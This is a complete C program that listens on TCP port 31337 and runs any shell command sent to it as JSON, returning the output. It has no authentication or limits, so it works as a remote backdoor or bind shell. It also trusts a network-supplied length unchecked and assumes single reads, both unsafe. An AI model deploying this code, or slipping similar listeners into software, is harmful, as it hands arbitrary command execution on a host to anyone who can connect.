#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <json-c/json.h>

#define PORT 31337
#define MAXLINE 1024

// Run a shell command and send its output
void execute_and_send(int client_fd, const char *cmd) {
    FILE *fp;
    char buffer[MAXLINE];

    // Run the command using popen
    fp = popen(cmd, "r");
    if (!fp) {
        snprintf(buffer, sizeof(buffer), "Error executing command: %s\n", strerror(errno));
        send(client_fd, buffer, strlen(buffer), 0);
        return;
    }

    // Read command output and send to client
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        send(client_fd, buffer, strlen(buffer), 0);
    }

    pclose(fp);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Bind
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Listen
    if (listen(server_fd, 1) == -1) {
        perror("listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("🔌 Shell server running on port %d...\n", PORT);

    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }
        printf("✅ Client connected\n");

        while (1) {
            uint32_t len;
            int n = recv(client_fd, &len, sizeof(len), 0);
            if (n <= 0) {
                printf("❌ Client disconnected\n");
                close(client_fd);
                break;
            }

            // Receive JSON payload
            char *payload = malloc(len + 1);
            recv(client_fd, payload, len, 0);
            payload[len] = '\0';

            // Parse JSON
            struct json_object *root = json_tokener_parse(payload);
            const char *cmd = NULL;
            if (root) {
                struct json_object *cmd_obj;
                if (json_object_object_get_ex(root, "command", &cmd_obj))
                    cmd = json_object_get_string(cmd_obj);
            }

            if (cmd) {
                printf("🧠 Executing: %s\n", cmd);
                execute_and_send(client_fd, cmd);
            } else {
                const char *msg = "[Error] Invalid JSON\n";
                send(client_fd, msg, strlen(msg), 0);
            }

            free(payload);
            if (root) json_object_put(root);
        }
    }

    close(server_fd);
    return 0;
}
